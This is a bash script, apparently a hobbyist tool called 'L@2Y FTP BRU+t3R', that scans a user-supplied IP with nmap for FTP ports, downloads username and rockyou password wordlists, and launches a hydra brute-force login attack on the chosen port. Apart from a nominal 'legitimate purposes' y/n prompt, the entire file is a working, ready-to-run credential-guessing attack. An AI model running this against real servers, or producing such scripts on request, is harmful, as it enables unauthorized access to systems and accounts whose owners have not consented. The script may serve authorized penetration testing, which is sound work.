#!/bin/bash
# Print welcome message
echo "*************************************************************"
echo "*                                                           *"
echo "*                 L@2Y FTP BRU+t3R                          *"
echo "*                                                           *"
echo "*************************************************************"
echo ""

# Just promise me to use it only for legit pentest. Ok?
read -p "Do you agree to use this script for legitimate purposes only? (y/n)" answer
if [[ $answer != y ]]; then
    echo "Aborting..."
    exit 1
fi

# Check if necessary tools are installed
if ! command -v nmap &> /dev/null
then
    echo "nmap could not be found, please install it using 'sudo apt install nmap'"
    exit
fi

if ! command -v wget &> /dev/null
then
    echo "wget could not be found, please install it using 'sudo apt install wget'"
    exit
fi

if ! command -v hydra &> /dev/null
then
    echo "hydra could not be found, please install it using 'sudo apt install hydra'"
    exit
fi

# Get target IP address
read -p "Enter target IP address: " target_ip

# Scan for open ports with nmap
echo "Hold on...Scanning for open ports..."
nmap -sV -T4 --max-rate=10000 -p- $target_ip | tee nmap_scan.txt

# Grep for open FTP ports
ftp_ports=$(grep -E "ftp" nmap_scan.txt | awk '{print $1}' | cut -d/ -f1)
if [[ -z "$ftp_ports" ]]; then
    echo "No open FTP ports found. Sorry..."
    exit 1
fi

# Ask which FTP port to bruteforce
if [[ $(echo "$ftp_ports" | wc -l) -eq 1 ]]; then
    port=$(echo "$ftp_ports")
else
    echo "Multiple FTP ports was found here: "
    echo "$ftp_ports"
    read -p "So ... Enter the port number you want to brute force: " port
    while [[ ! "$ftp_ports" =~ "$port" ]]; do
        read -p "Ooops...Invalid port number. Please enter a valid port number: " port
    done
fi

# We need this. Right? Of course, we can invite a fortune-teller and read Tarot cards. But let's do it with the help of dictionaries.
if [[ ! -f "usernames.txt" ]]; then
    echo "Downloading usernames.txt..."
    wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt -O usernames.txt
fi

if [[ ! -f "passwords.txt" ]]; then
    echo "Downloading passwords.txt..."
    wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O passwords.txt
fi

# Start bruteforcing with hydra
echo "Here we go! Starting brute force attack on FTP port $port..."
hydra -L usernames.txt -P passwords.txt -f -e nsr -t 4 -s $port ftp://$target_ip | tee hydra_results.txt

echo "Results: "
cat hydra_results.txt
